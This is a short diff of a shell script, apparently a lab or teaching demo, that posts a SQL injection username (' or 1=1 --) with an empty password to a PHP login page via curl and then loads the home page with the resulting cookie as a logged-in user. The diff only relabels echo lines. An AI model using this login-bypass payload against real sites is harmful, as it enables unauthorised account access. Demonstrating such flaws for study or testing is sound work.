@@ -14,7 +14,7 @@ HOME_PAGE="$PREFIX/index.php"
 echo "Using Login Page at: $POST_PAGE"
 echo "Using Home Page at: $HOME_PAGE"
 
-echo "=====[Login]====="
+echo "=====[Login with SQL Injection Attack]====="
 ATTACK_USERNAME="' or 1=1 --"
 ATTACK_PASSWORD=""
 echo "Using attack username: $ATTACK_USERNAME"
@@ -30,6 +30,6 @@ curl \
 $POST_PAGE
 echo
 
-echo "=====[Index Page]====="
+echo "=====[Index Page: Logged-in as User uhengartner]====="
 echo "Showing index page with GET request"
 curl -b "cookie.txt" $HOME_PAGE
